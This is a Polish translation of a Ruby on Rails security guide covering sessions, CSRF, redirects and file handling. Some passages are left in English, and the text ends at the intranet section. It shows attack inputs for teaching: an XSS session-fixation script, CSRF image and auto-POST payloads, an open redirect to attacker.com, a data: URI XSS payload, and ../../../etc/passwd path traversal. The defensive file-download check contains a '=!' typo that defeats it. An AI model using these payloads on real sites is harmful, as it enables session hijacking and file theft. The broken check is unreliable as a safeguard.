Bezpieczeństwo w Ruby On Rails
================================
 
Ten przewodnik opisuje częste problemy związane z bezpieczeństwem w aplikacjach internetowych i pokazuje jak ich uniknąć stosując Railsy. Jeśli masz jakiekolwiek pytania lub sugestie, wyślij wiadomość do Heiko Webers'a na maila: 42 {_et_} rorsecurity.info. Po przeczytaniu tego przewodnika powinieneś znać takie zagadnienia jak:

- Wszystkie [,#fffcdb]#najistotniejsze sposoby obrony#
- Sesje w Railsach, jak są obsługiwane, co można w nich przechowywać oraz jak mogą być atakowane
- Jak zwykłe odwiedzenie witryny może stać się problemem związanym z bezpieczeństwem (przez atak CSRF)
- Na co musisz zwracać uwagę przy pracy z plikami lub dostarczaniu interfejsu administracyjnego
- Swoisty dla Railsów problem z masowym przypisaniem
- Jak zarządzać użytkownikami: logowanie, wylogowanie i metody ataku na wszystkich poziomach.
- I najbardziej popularne metody ataku typu injection

== Wstęp

Frameworki powstały by pomagać projektantom w tworzeniu aplikacji internetowych. Niektóre z nich mogą być pomocne także przy ochronie aplikacji przed atakami. W rzeczywistości wszystkie frameworki są tak samo bezpieczne: jeśli stosujesz je prawidłowo będziesz w stanie stworzyć bezpieczne aplikacje używając niemalże każdego z frameworków. W Ruby on Rails można znaleźć kilka helperów rozwiązujących takie problemy jak np. ataki typu injection. Z przyjemnością muszę stwierdzić, że wszystkie Railsowe aplikacje, które audytowałem miały wysoki poziom bezpieczeństwa.

Ogólnie rzecz biorąc nie ma sposobu na zapewnienie natychmiastowej ochrony aplikacji przed wszystkimi rodzajami ataku. Bezpieczeństwo zależy od ludzi używających frameworka, od metody projektowania jak również od wszystkich poziomów środowiska aplikacji internetowej: silnika aplikacji, serwera, lub aplikacji samej w sobie (i prawdopodobnie od innych poziomów aplikacji).

Gartner Group oszacowała jednak, że 75% ataków dotyczy poziomu aplikacji internetowej. Okazało się, „że spośród 300 audytowanych stron 97% było narażonych na atak”. Dzieje się tak dlatego, ponieważ aplikacje internetowe są stosunkowo łatwym celem ataku. Nawet laik bez trudu może zrozumieć ich działanie i w prosty sposób nimi manipulować.

Zagrożenia wobec aplikacji internetowych to między innymi: przejęcie konta użytkownika, ominięcie kontroli dostępu, czytanie lub modyfikowanie poufnych danych, prezentacja fałszywych treści. Atakujący może również zainstalować konia trojańskiego, lub oprogramowanie rozsyłające niepożądane maile w celu uzyskania korzyści finansowych lub w celu zniszczenia dobrego imienia firmy poprzez modyfikację cennych materiałów. Jeśli chcesz zapobiegać atakom, zminimalizować ich działanie i wyeliminować potencjalne miejsca, w których mógłby nastąpić atak, musisz najpierw w pełni zrozumieć metody ataku. I to właśnie jest celem tego przewodnika.

W celu rozwoju bezpiecznej aplikacji internetowej musisz aktualizować wszystkie jej poziomy i poznać swoich wrogów. Żeby być na bieżąco z aktualnymi informacjami o bezpieczeństwie dopisz się do odpowiednich list mailingowych, czytaj blogi i postaraj się, żeby aktualizowanie i kontrolowanie bezpieczeństwa Twojej aplikacji weszło Ci w nawyk (sprawdź w rozdziale „Dodatkowe materiały”). Ja robię to ręcznie ponieważ to najlepszy sposób, żeby znaleźć złośliwe problemy związane z bezpieczeństwem.

== Sesje
 
Rozważając kwestię bezpieczeństwa dobrze zwrócić uwagę na sesje, które mogą być szczególnie narażone na ataki.
 
=== Czym są sesje?
 
-- _HTTP jest bezstanowym protokołem. Sesje to zmieniają._
 
Większość aplikacji wymaga śledzenia stanu danego użytkownika. Może to dotyczyć zawartości koszyka zakupów lub ID aktualnie zalogowanego użytkownika. Gdyby nie sesje, użytkownik musiałby identyfikować się i uwierzytelniać przy każdej podejmowanej akcji. 
Railsy tworzą nową sesję automatycznie, w chwili gdy użytkownik zaczyna korzystać z  nowej aplikacji. W przypadku gdy użytkownik korzystał już z aplikacji, wczytywana jest istniejąca sesja.
 
Sesja zwykle składa się z tablicy asocjacyjnej wartości i identyfikatora sesji. Zwykle jest to 32-znakowy łańcuch do określenia tablicy asocjacyjnej. Każde cookie wysłane do przeglądarki klienta zawiera identyfikator sesji. I odwrotnie: przeglądarka wysyła je do serwera, na każde żądanie klienta. W Railsach można zapisać i pobrać wartości używając metody sesji:
 
[source, ruby]
----------------------------------------------------------------------------
session[:user_id] = @current_user.id
User.find(session[:user_id])
----------------------------------------------------------------------------
 
=== Identyfikator sesji
 
-- _The session id is a 32 byte long MD5 hash value._

-- _Identyfikator sesji jest 32 bajtową wartością hash MD5._

Identyfikator sesji składa się z wartości hash losowego ciągu znaków. Losowy ciąg znaków to aktualny czas, losowa liczba między 0 a 1, id procesu interpretera Ruby (również po prostu losowa liczba) i stały ciąg znaków. Obecnie atak typu brute-force na ID sesji w Railsach jest niemożliwy. Do tej pory MD5 był bezkonkurencyjny, jednak znaleziono sposób na generowanie kolizji. Oznacza to, że różne dane wejściowe mogą mieć taką samą wartość hash. Jednak nie ma to żadnego wpływu na bezpieczeństwo daty.
 
=== Przechwytywanie sesji

-- _Kradzież identyfikatora sesji użytkownika pozwala atakującemu umożliwia atakującemu dostęp do danej aplikacji internetowej, tak, jakby korzystał z niej pełnoprawny użytkownik._

Wiele aplikacji internetowych ma następujący system uwierzytelniania: użytkownik wprowadza nazwę użytkownika i hasło, aplikacja sprawdza dane i przechowuje identyfikator sprawdzonego użytkownika w tablicy asocjacyjnej sesji. Od tej chwili sesja jest ważna. Na każde żądanie aplikacja wczyta użytkownika o danym identyfikatorze użytkownika bez potrzeby uwierzytelniania. Identyfikator sesji jest odpowiedzialny za identyfikacje sesji.

Stąd wynika, że cookies są wykorzystwane do tymczasowego uwierzytelniania w aplikacjach internetowych. Każdy kto przejmie czyjeś cookies, może używać aplikacji jako ten użytkownik - co może powodować poważne konsekwencje. Oto kilka sposobów na przejęcie sesji i sposoby obrony przed atakiem:
 
- Wywęszenie cookies w niezabezpieczonej sieci. Bezprzewodowa sieć może posłużyć jako przykład takiej sieci. W nieszyfrowanej sieci bezprzewodowej śledzenie ruchu wszystkich podłączonych klientów jest szczególnie łatwe. Jest to jeden z powodów, dla których powinniśy zrezygnować z pracy w kawiarniach. Dla projektantów aplikacji internetowych oznacza to [,#fffcdb] #konieczność zapewnienia bezpiecznego połączenia przez SSL#.
 
- Większość ludzi nie kasuje cookies po pracy na publicznym sprzęcie. Więc jeśli ostatni użytkownik nie wylogował się z aplikacji internetowej, ktoś inny może się pod niego podszywać. Dlatego ważne jest, aby zapewnić użytkownikowi [,#fffcdb]#widoczny przycisk do wylogowania#.
 
- Wiele ataków typu cross-site scripting (XSS) ma na celu pozyskanie cookies użytkownika. Więcej informacji o atakach typu XSS znajduje się w dalszej części podręcznika.
 
- Atakujący może spreparować ID sesji użytkownika zamiast kradzieży nieznanych cookies. Więcej informacji o atakach typu session fixation znajduje się w dalszej części podręcznika.
 
Głównym celem większości atakujących jest korzyść finansowa. Ceny za skradzione loginy do kont bankowych na czarnym rynku są wyceniane od 10 do 1000 dolarów (w zależności od środków na koncie). Numery kart kredytowych są warte od 0,40 do 20 dolarów. Za konta na stronach z aukcjami online – 1 do 8 dolarów. Hasła do kont mailowych kosztują od 4 do 30 dolarów. Dane pochodzą ze strony: http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf[Symantec Global Internet Security Threat Report]. 
 
=== Wskazówki dotyczące sesji
 
-- _Kilka ogólnych wskazówek dotyczących sesji._
  
- Nie przechowuj dużych obiektów w sesji. Zamiast tego powinieneś przechowywać je w bazie danych i zapisywać ich ID w sesji. Rozwiążesz w ten sposób problemy z synchronizacją i nie zapełnisz miejsca w sesji (w zależności od tego jaką pojemność wybrałeś, patrz poniżej).  

- [,#fffcdb]#Ważne dane nie powinny być przechowywane w sesjach#. Gdy użytkownik wyczyści cookies albo zamknie przeglądarkę nie będzie mógł ich odzyskać. Przechowując dane w sesji po stronie klienta, użytkownik będzie mógł z nich korzystać. 
 
=== Session storage
 
-- _Railsy zapewniają kilka mechanizmów przechowywania hashów sesji wartości. Najważniejszymi z nich są ActiveRecordStore i CookieStore._
 
Można wymienić wiele sposobów przechowywania sesji, np. gdy Railsy zapisują hash i id sesji. Większość aplikacji typu Real-live korzysta z ActiveRecordStore (lub jej pochodnych). ActiveRecordStore przechowuje hash i id sesji w tabeli w bazie danych. Hash jest zapisywany i wczytywany na każde żądanie.

W Railsach 2 wprowadzono nowy domyślny sposób przechowywania sesji - CookieStore. CookieStore zapisuje hash sesji bezpośrednio w cookie po stronie klienta, skąd wczytywany jest przez serwer. Dzięki temu id sesji staje się zbędne, a aplikacja działa dużo szybciej. Jednak jest to dość kontrowersyjny sposób przechowywania i trzeba wziąć pod uwagę kilka kwestii związanych z bezpieczeństwem tego sposobu:
  
- Rozmiar cookies nie może przekraczać 4K. Jest to w porządku, jednak nie powinno się przechowywać w cookies dużej ilości danych, odwołując się do tego co napisałem wcześniej. [,#fffcdb]#Przechowywanie id bazy danych danego użytkownika jest dobrym rozwiązaniem#.

- Użytkownik może zobaczyć wszystko co przechowujesz w sesji, ponieważ przechowywane dane są w postaci tekstowej (właściwie są one zakodowane w Base64, ale nie szyfrowane) Więc zapewne [,#fffcdb]#nie chciałbyś przechowywać tu żadnych sekretnych danych#. Żeby zapobiec manipulacji hasha sesji, skrót jest wyliczany na podstawie sesji z tajnym kluczem (secret) po stronie serwera i umieszczany na końcu pliku cookie.
 
Oznacza to, że bezpieczeństwo przechowywania jest zależne od tajnego klucza (I od algorytmu funkcji skrótu, którym domyślnie jest, jak do tej pory niezastąpiony, SHA512). Więc [,#fffcdb]#nie używaj prostych kluczy takich jak słowa ze słownika, lub kluczy poniżej 30 znaków#. Umieść swój tajny klucz w environment.rb:
 
....................................
config.action_controller.session = {
  :key         => ‘_app_session’,
  :secret      => ‘0x0dkfj3927dkc7djdh36rkckdfzsg...’
}
....................................
 
Istnieją jednak, pochodne CookieStore które szyfrują hash sesji, więc klient nie może go zobaczyć.
 
=== Ataki typu Replay na sesje CookieStore.
 
-- _Kolejnym sposobem ataku, którego powinieneś się obawiać gdy używasz CookieStore, jest atak typu replay._

Wygląda to tak:
 
- Użytkownik otrzymuje kredyty, kwota jest przechowywana w sesji (co jest złym pomysłem, ale użyłem tego przykładu dla celów demonstracyjnych). 
- Użytkownik kupuje jakiś przedmiot. 
- Jego nowy, niższy kredyt będzie przechowywany w sesji. 
- Ciemna strona mocy użytkownika każe mu wziąć cookie z pierwszego kroku (które wcześniej skopiował) i zastąpić obecne cookie w przeglądarce. 
- Użytkownik ma swój kredyt z powrotem.
 
Zastosowanie nonce (losowa wartość) w sesji rozwiązuje problem ataku typu replay. Nonce jest ważna tylko raz i serwer musi śledzić wszystkie ważne nonce. To staje się jeszcze bardziej skomplikowane, jeśli twoja aplikacja znajduje się na kilku serwerach (mongrels). Przechowywanie nonce w tabeli bazy danych niszczy całą ideę CookieStore (unikanie łączenia się z bazą danych).
 
Najlepszym [,#fffcdb]#rozwiązaniem jest przechowywanie tego rodzaju danych nie w sesji, lecz w bazie danych#. W tym przypadku kredyt powinien być przechowywany w bazie danych, a id_zalogowanego_użytkownika (logged_in_user_id) w sesji.

=== Atak typu Session fixation
 
-- _Oprócz kradzieży identyfikatora sesji użytkownika, atakujący może spreparować identyfikator sesji dla użytkownika. Zjawisko to jest określane mianem ataku typu session fixation.
 
image::images/session_fixation.png[Session fixation]
 
Ten atak skupia się na spreparowaniu identyfikatora sesji dla użytkownika, który jest znany atakujący i zmuszeniu użytkownika do korzystania z tego identyfikatora. Zatem atakujący nie musi później kraść identyfikatora sesji. Oto jak działa ten atak:
 
. Atakujący tworzy ważny identyfikator sesji: Ładuje stronę logowania aplikacji internetowej (która ma być obiektem ataku typu session fixation), i pozyskuje identyfikator sesji, wysłany w odpowiedzi z serwera w pliku cookie (patrz nr 1 i 2 na obrazku).
 
. Atakujący prawdopodobnie będzie kontynuował sesję. Wygasanie sesji, na przykład co 20 minut, znacznie skraca czas przewidziany dla ataku. Dlatego atakujący co jakiś czas otwiera aplikację internetową, żeby podtrzymać sesję.
 
. Teraz atakujący może zmusić przeglądarkę użytkownika do korzystania z jego identyfikatora sesji (patrz nr 3 na obrazku). Ponieważ nie można zmienić cookie innej domeny (z powodu zasady tożsamego pochodzenia - same origin policy), atakujący musi uruchomić JavaScript z domeny docelowej aplikacji internetowej. Wdrożenie (Injection) własnego kodu JavaScript do aplikacji będącej obiektem ataku jest możliwe dzięki takim metodom jak XSS. Oto przykład: 
+<script> document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9"; </script>+
Więcej informacji o atakach typu XSS i Injection znajduje się w dalszej części podręcznika.
  
. Atakujący wabi ofiary do stron zainfekowanych kodem JavaScript. Przeglądając stronę, przeglądarka ofiary zmienia identyfikator sesji na identyfikator sesji-pułapki.
 
. Ponieważ nowa sesja-pułapka nie była do tej pory nieużywana, aplikacja internetowa będzie wymagać uwierzytelnienia użytkownika. 
 
. Od tej pory, ofiara i atakujący będą wspólnie używać aplikacji internetowej, korzystając z tej samej sesji: Sesja stała się ważna, a ofiara nie zauważyła ataku.
 
=== Sposoby obrony przed atakiem typu session fixation
 
-- _Jedna linia kodu może ochronić Cię przed atakiem typu session fixation._
  
Najskuteczniejszą ochroną jest [,#fffcdb]#wydanie nowego identyfikatora sesji# i zadeklarowanie starego jako nieważnego po udanym logowaniu. W ten sposób atakujący nie może używać spreparowanych identyfikatorów sesji. Jest to również dobry sposób obrony przeciw przejęciu sesji. Oto jak utworzyć nową sesję w Railsach:

[source, ruby]
----------------------------------------------------------------------------
reset_session
----------------------------------------------------------------------------
 
W przypadku korzystania z popularnej wtyczki RestfulAuthentication do zarządzania użytkownikami, należy dodać reset_session do akcji SessionsController#create. Zwróć uwagę, że ta akcja usuwa wszystkie wartości z sesji, [,#fffcdb]# więc musisz przenieść je do nowej sesji#.
  
Innym sposobem obrony jest [,#fffcdb]#zapisywanie specyficznych właściwości użytkownika w sesji#, weryfikowanie ich przy każdym żądaniu i odmowa dostępu, jeśli informacje te nie pasują do siebie. Takimi właściwościami mogą być adres IP lub user agent (nazwa przeglądarki internetowej), choć ta ostatnia nie jest aż tak bardzo charakterystyczna dla użytkownika. Podczas zapisywania adresu IP, musisz pamiętać, że istnieją dostawcy usług internetowych oraz duże organizacje, które oferują swoim użytkownikom dostęp do Internetu przez proxy. [,#fffcdb]# Adresy IP tych użytkowników mogą ulegać zmianom w trakcie sesji#, więc nie będą oni mogli korzystać z aplikacji, lub tylko w ograniczonym zakresie.

=== Wygasanie sesji

_Sesja, która nigdy nie wygasa daje więcej czasu atakującym na przeprowadzenie ataku typu cross-site reference forgery (CSRF), przechwytywanie sesji i session fixation._
 
Jedną z możliwości jest ustawienie czasu wygaśnięcia cookie przechowującego id sesji. Jednak klient może edytować pliki cookies, które są przechowywane w przeglądarce internetowej tak, żeby wygasające sesje na serwerze były bezpieczniejsze. Oto przykład, jak [,#fffcdb]#ustawić wygasanie sesji w tabeli bazy danych#. Session.sweep(„20m”) powoduje wygaśnięcie sesji, które były używane wcześniej niż 20 minut temu.
 
[source, ruby]
----------------------------------------------------------------------------
class Session < ActiveRecord::Base
 def self.sweep(time_ago = nil)
     time = case time_ago
       when /^(\d+)m$/ then Time.now - $1.to_i.minute
       when /^(\d+)h$/ then Time.now - $1.to_i.hour
       when /^(\d+)d$/ then Time.now - $1.to_i.day
       else Time.now - 1.hour
     end
     self.delete_all "updated_at < '#{time.to_s(:db)}'"
   end
 end
----------------------------------------------------------------------------

W Sekcji na temat ataku typu session fixation zapoznaliśmy się problemem utrzymania sesji. Atakujący odświeżając sesję co pięć minut jest w stanie bez końca utrzymywać sesję przy życiu, mimo tego, że sesja użytkownika już wygasła. Prostym rozwiązaniem tego problemu może być dodanie kolumny created_at do tabeli sesji. W ten sposób możesz usunąć sesje, które zostały stworzone dawno temu. Dodaj tą linię kodu, do metody, która opisałem powyżej:
 
[source, ruby]
----------------------------------------------------------------------------
self.delete_all "updated_at < '#{time.to_s(:db)}' OR created_at < '#{2.days.ago.to_s(:db)}'"
----------------------------------------------------------------------------

-- _Ta metoda ataku dodaje złośliwy kod lub link na stronie internetowej, która jest odpowiedzialna za dostęp do aplikacji, w taki sposób że użytkownikowi wydaje się, że został uwierzytelniony. Jeśli sesja dla tej aplikacji nie wygasła, atakujący może bezprawnie wykonywać polecenia._
 
image::images/csrf.png[CSRF]
 
W rozdziale o sesjach dowiedzieliśmy się, że większość aplikacji Railsowych wykorzystuje sesje oparte na cookies. Każda z nich przechowuje identyfikator sesji w pliku cookie i hash sesji trzymaja po stronie serwera, lub też cały hash sesji przechowuje po stronie klienta. We wszystkich przypadkach przeglądarka, na każde żądanie, automatycznie przesyła dalej cookie do domeny, oczywiście jeśli może odnaleźć cookie dla danej domeny. Zagrożeniem może być fakt, że przeglądarka będzie również wysłać plik cookie, jeśli żądanie przyjdzie ze strony na innej domenie. Zacznijmy od przykładu:
 
- Bob przegląda forum i widzi wpis (post) hakera, zawierający spreparowany element HTML typu img (obrazek). Element odnosi się raczej do komendy w aplikacji zarządzania projektem Boba, zamiast obrazka. 
- +<img src="http://www.webapp.com/project/1/destroy">+
- Sesja Boba na www.webapp.com jest wciąż aktywna, bo nie wylogował się kilka minut temu. 
- Poprzez oglądanie wpisu, przeglądarka znajdzie tag obrazka. Następnie spróbuje wczytać podejrzany obrazek z www.webapp.com. Zgodnie z tym, co napisałem wcześniej, przeglądarka prześle również cookie z ważnym identyfikator sesji. 
- Aplikacja internetowa na www.webapp.com sprawdzi informacje o użytkowniku w odpowiednim hashu sesji i zniszczy projekt z ID 1. Następnie zwróci stronę, która będzie nieoczekiwanym wynikiem dla przeglądarki, więc nie wyświetli się żaden obrazek. 
- Bob nie zauważy ataku -- ale po kilku dniach stwierdzi, że projekt numer 1 zniknał.
 
Ważne jest, aby zauważyć, że spreparowany obrazek lub link nie koniecznie musi znajdować się na domenie, gdzie znajduje się aplikacja - może być w dowolnym miejscu - na forum, blogu lub w mailu. 
 
CSRF pojawia się bardzo rzadko w CVE (Common Vulnerabilities and Exposures) -- mniej niż 0,1% w 2006 r. -- ale tak naprawdę jest to "śpiący olbrzym" [Grossman]. Kontrastuje to znacząco z wynikami moich (i innych) zleceń dotyczących pracy z bezpieczeństwem - [,#fffcdb]#CSRF jest ważną kwestią bezpieczeństwa#.

=== Sposoby ochrony przed atakiem typu CSRF 

-- _Po pierwsze, jak to jest wymagane przez W3C, używaj odpowiednio GET i POST. Po drugie, używaj tokena zabezpieczającego przy metodach non-GET, żeby chronić aplikację przed CSRF._

Protokół HTTP przewiduje zasadniczo dwa główne rodzaje wniosków - GET i POST (i więcej, ale nie są one obsługiwane przez większość przeglądarek). World Wide Web Consortium (W3C) podaje spis sytuacji, w których stosujemy GET lub POST:
 
*Używaj GET jeśli:*

- Interakcja przypomina [,#fffcdb]#zapytanie# (np. jeśli jest to bezpieczna operacja taka jak kwerenda (query), operacja czytania (read operation), albo wyszukiwania (lookup).
 
*Używaj  POST jeśli:*
 
- Interakcja przypomina [,#fffcdb]#komendę#, lub
- Interakcja [,#fffcdb]#powoduje zmianę# zasobów w sposób zauważalny dla użytkownika (np. subskrypcja serwisu), lub
- Użytkownik [,#fffcdb]#jest odpowiedzialny za wynik działania# interakcji.

Jeśli aplikacja internetowa jest RESTful, możesz również korzystać z dodatkowych  metod HTTP, takich jak PUT lub DELETE. Większość współczesnych przeglądarek internetowych ich nie obsługuje, jednak Railsy wykorzystują ukryte pole +_method+, żeby ominąć tą barierę.
 
[,#fffcdb]#Sprawdzanie metody (verify method) w kontrolerze sprawdza czy konkretne akcje nie mogą być wykorzystywane przez GET#. Oto przykład, w którym sprawdzane jest wykorzystanie akcji transferu przez POST. Jeżeli akcja jakiejkolwiek innej metody HTTP, zostaje ona przekierowana do listy akcji.
 
.................................................................................
verify :method => :post, :only => [:transfer], :redirect_to => {:action => :list}
.................................................................................

Dzięki tej ostrożności, wyżej opisany atak nie zadziała, ponieważ przeglądarka wysyła żądanie GET dla obrazków, które nie zostanie zaakceptowane przez aplikację internetową. 
 
Ale to dopiero pierwszy krok, ponieważ [,#fffcdb]#żądanie POST również może być wysłane automatycznie#. Oto przykład linku, który wyświetla www.harmless.com jako miejsce docelowe w pasku statusu przeglądarki. W rzeczywistości to dynamicznie tworzy nowy formularz, który wysyła żądanie POST.
 
[source, html]
----------------------------------------------------------------------------
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
----------------------------------------------------------------------------

Atakujący może też umieścić kod w zdarzeniu onmouseover dla obrazka:
 
+<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />+
 
Istnieje wiele innych możliwości (w tym Ajax) ataku ofiary w tle.  [,#fffcdb]#Rozwiązaniem tego problemu może być użycie tokena zabezpieczającego w żądaniach typu non-GET# sprawdzanego po stronie serwera. W Rails 2 lub wyższym, jest to jedna linia kodu w kontrolerze aplikacji: 
 
+protect_from_forgery :secret => "123456789012345678901234567890..."+
 
Spowoduje to automatyczne dołączenie zabezpieczenia tokena, wyliczonego na podstawie bieżącej sesji i tajnego klucza (secret), we wszystkich formularzach i żądaniach Ajaxowych generowanych w Railsach. Klucz (secret) nie będzie potrzebny, jeśli używasz CookieStorage jako ze sposobu przechowywania sesji. Aplikacja wyrzuci błąd ActionController::InvalidAuthenticityToken jeśli token nie będzie poprawny.
 
Należy pamiętać, że [,#fffcdb]#atak typu cross-site scripting (XSS) omija wszystkie zabezpieczenia przed atakami typu CSRF#. XSS pozwala atakującemu na dostęp do wszystkich elementów na stronie, także może on odczytać token zabezpieczający przed CSRF z formularza lub bezpośrednio wysłać formularz. Więcej informacji o atakach typu XSS znajduje się w dalszej części podręcznika.
 
== Przekierowania i pliki

Inną grupą elementów podatnych na atak są przekierowania i pliki w aplikacjach internetowych.
 
=== Przekierowania
 
-- _Przekierowanie w aplikacji internetowej to niedoceniane narzędzie krakingu: Atakujący może zarówno weprowadzić użytkownika na stronę-pułapkę, jak i przygotować niezależny atak._
 
Każdy przypadek, gdy użytkownik ma możliwość rozwinięcia linku (jego części) do przekierowania, stanowi prawdopodobne zagrożone. Najbardziej oczywisty atak to przekierowanie użytkowników do fałszywych stron, które wyglądają dokładnie jak oryginalne. Ten atak (typu phishing) działa poprzez wysłanie zwyczajnie wyglądających linków w wiadomości e-mai, injecting the link by XSS in the web application or umieszczanie linków do innych stron. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to=www.attacker.com. Here is an example of a legacy action:

Nie wygląda to podejrzanie, ponieważ URL zaczyna się jak link do zwyczajnej, niegroźnej strony internetowej, a URL do strony, z której płynie zagrożenie, jest ukryty w parametrze przekierowania: http://www.example.com/site/redirect?to=www.attacker.com. Oto przykład akcji dziedziczenia (legacy action):
 
[source, ruby]
----------------------------------------------------------------------------
def legacy
  redirect_to(params.update(:action=>'main'))
end
----------------------------------------------------------------------------

Będzie ona przekierowywać użytkownika do głównej akcji, jeśli próbował uzyskać dostęp do akcji dziedziczenia. Naszym zamiarem było zabezpieczenie parametrów w adresach URL w akcji dziedziczenia i przekazanie ich do głównej akcji. Jednakże może to być wykorzystane przez atakującego, jeśli zawrze on klucz hosta adresie URL:
 
+http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com+
 
Jeśli jest on na końcu adresu URL, ciężko go zauważyć i przekierowuje użytkownika do hosta attacker.com. Prostą ochroną byłoby [#,fffcdb]#zawieranie tylko oczekiwanych parametrów akcji dziedziczenia# (biała lista (whitelist) uchodzi za alternatywę dla usuwania nieoczekiwanych parametrów). [#,fffcdb]#Każde przekierowanie do adresu URL, należy sprawdzać z białą listą lub dozwolonymi wyrażeniami regularnymi#. 
 
==== Niezależny atak typu XSS
 
Kolejnymi atakami są przekierowywania i niezależny atak XSS działające w przeglądarkach Firefox i Opera przez wykorzystanie protokołu danych. Protokół ten wyświetla swoją zawartość bezpośrednio w przeglądarce i może mieć postać wszystkiego - od kodu HTML lub JavaScript do całego zdjęcia: 

+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K+
 
W tym przykładzie został użyty zaszyfrowany, metodą Base64, kod JavaScript, który wyświetla proste okno dialogowe. W przekierowaniu URL, atakujący może przekierować użytkownika na adres URL ze złośliwym kodem. Żeby bronić się przed takimi atakami, [#,fffcdb]#nie powinieneś pozwalać użytkownikowi na przekierowania (części) adresu URL#.
 
=== Wysyłanie (upload) plików
 
-- _Upewnij się, że pliki wysyłane na serwer nie nadpiszą ważnych plików i że są one przetwarzane asynchronicznie._

Wiele aplikacji internetowych pozwala użytkownikowi na wysyłanie własnych plików. [,#fffcdb]#Nazwy plików, które wybierze użytkownik zawsze powinny być filtrowane# ponieważ atakujący może użyć złośliwych nazw plików, żeby nadpisać ważne pliki na serwerze. Jeśli przechowujesz wczytane pliki w katalogu /var/www/uploads i jeśli użytkownik wyśle plik o nazwie „../../../etc/passwd”, może nadpisać któryś z ważnych plików. Oczywiście interpreter Ruby wymaga odpowiednich praw, żeby to zrobić – kolejny powód, żeby odpalać serwery, serwery baz danych i inne programy jako mniej uprzywilejowany użytkownik Unixowy. 
 
Gdy filtrujesz pliki nadesłane przez użytkownika, [,#fffcdb]#nie staraj się usunąć złośliwych części#. Pomyśl o sytuacji, gdy aplikacja internetowa usuwa wszystkie “../” w nazwie pliku, a atakujący użyje takiej nazwy: “....//” – rezultat będzie taki: “../”. Najlepszym rozwiązaniem będzie stworzenie białej listy, dzięki której [,#fffcdb]# będzie można sprawdzić czy nazwa pliku zawiera dozwolone znaki#. Jest to alternatywa dla czarnej listy, która ma za zadanie usuwać niedozwolone znaki. W przypadku, gdy nazwa jest niepoprawna odrzuć ją (lub zastąp niedozwolone znaki), ale nie usuwaj jej. Pod tym likniem znajdziesz przydatne narzędzie do obsługi nazw plików: http://github.com/technoweenie/attachment_fu/tree/master[attachment_fu plugin]:
 
[source, ruby]
----------------------------------------------------------------------------
def sanitize_filename(filename)
  returning filename.strip do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.gsub! /^.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
----------------------------------------------------------------------------

Znaczna niekorzyść synchronicznego przetwarzania wczytywania plików (jak np. plugin attachment_fu może zrobić z obrazami), jest jego [#,fffcdb]#podatność na ataki typu danial-of-service#. Atakujący może synchronicznie rozpocząć wysyłanie obrazka z wielu komputerów, co zwiększa obciążenie serwera i może prowadzić do awarii serwera. 

Najlepszym rozwiązaniem jest [#,fffcdb]#asynchroniczne przetwarzanie plików (w szczególności obrazków i filmów)#: Zapisz plik i ustaw harmonogram przetwarzania żądania w bazie danych. Drugi proces zajmie się przetwarzaniem plików w tle. 
 
=== Wykonywalny kod we wczytywanych plikach

-- _Kod źródłowy we wczytywanych plikach może być wykonywany, gdy umieszczony jest w konkretnych katalogów. Nie należy umieszczać wczytywanych plików w Rails / katalog publiczny, jeżeli jest katalog domowy Apache._ 

Popularny serwer Apache posiada opcję o nazwie DocumentRoot. Jest to katalog domowy strony internetowej. Wszystko w tym drzewie katalogów będzie obsługiwane przez serwer WWW. Jeśli istnieją pliki o określonych rozszerzeniach, kod zostanie wykonany, jeśli przyjdzie żądanie (może wymagać niektórych opcji do ustalenia). Przykładem mogą być pliki PHP i CGI. Teraz pomyśl o sytuacji, gdy atakujący wysyła na serwer plik "file.cgi" zawierający kod, który zostanie wykonany, gdy ktoś pobiera plik.
 
[,#fffcdb]#Jeśli DocumentRoot w Apache odnosi się do katalogu Rails' /public directory, nie umieszczaj w nim wczytywanych plików#, przechowuj pliki co najmniej jeden poziom niżej.
 
=== Ściąganie plików

-- _Upewnij się, czy użytkownicy nie mogą pobierać dowolnych plików._

Tak ja to było przy wysyłaniu plików na serwer, musisz filtrować nazwy plików przy pobieraniu. Metoda send_file() wysyła pliki z serwera do klienta. Jeśli używana jest nazwa pliku wpisywana użytkownika, bez filtrowania, można pobrać każdy plik:
 
[source, ruby]
----------------------------------------------------------------------------
send_file('/var/www/uploads/' + params[:filename])
----------------------------------------------------------------------------

Wystarczy podać nazwę pliku, taką jak "../../../etc/passwd" żeby pobrać dane do logowania serwera. Prostym rozwiązaniem jest [#,fffcdb]#sprawdzenie czy żądany plik znajduje się w tym katalogu, w którym się spodziewasz#:
 
[source, ruby]
----------------------------------------------------------------------------
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename =!
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, :disposition => 'inline'
----------------------------------------------------------------------------

Inny (dodatkowy) sposób to przechowywanie nazw plików w bazie danych i nazywanie plików na dysku według identyfikatorów w bazie danych. Jest to również dobry sposób, żeby uniknąć problemu kodu w nazwach wysyłanych plików. Wtyczka attachment_fu działa w podobny sposób.
 
== Ochrona Intranetu I nardzędzi administracyjnych
  
-- _Intranet i interfejsy administracyjne są popularnymi celami ataku, ponieważ umożliwiają one uprzywilejowany dostęp. Mimo to wymagają kilku dodatkowych środków bezpieczeństwa, odwrotnie jest w rzeczywistym świecie._

